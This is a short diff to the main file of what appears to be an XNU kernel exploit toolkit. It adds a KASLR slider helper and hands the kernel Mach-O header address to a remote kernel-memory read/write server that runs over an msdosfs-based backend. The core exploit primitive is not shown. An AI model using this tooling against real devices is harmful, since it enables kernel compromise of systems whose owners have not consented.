@@ -22,6 +22,7 @@
 #include "util_misc.h"
 #include "util_dispatch.h"
 #include "kmem_gym.h"
+#include "slider_kas.h"
 #include "kmem_msdosfs.h"
 #include "kmem_remote.h"
 #include "xnu_proc.h"
@@ -119,7 +120,7 @@ void capture_msdosfs_mount_pair(uintptr_t* ptr1_out, xe_allocator_msdosfs_t* all
 
 int main(int argc, const char* argv[]) {
     xe_kmem_use_backend(xe_kmem_gym_create());
-    xe_slider_init();
+    xe_slider_init(xe_slider_kas_get_mh_execute_header());
     xe_allocator_msdosfs_loadkext();
     
     uintptr_t worker_addr, helper_addr;
@@ -173,7 +174,10 @@ int main(int argc, const char* argv[]) {
     
     struct xe_kmem_backend* msdosfs_backend = xe_kmem_msdosfs_create(&args);
     xe_kmem_use_backend(msdosfs_backend);
-    xe_kmem_remote_server_start();
+    
+    struct xe_kmem_remote_server_ctx ctx;
+    ctx.mh_execute_header = xe_slider_kas_get_mh_execute_header();
+    xe_kmem_remote_server_start(&ctx);
     
     printf("[INFO] stopping server\n");
     xe_kmem_use_backend(xe_kmem_gym_create());
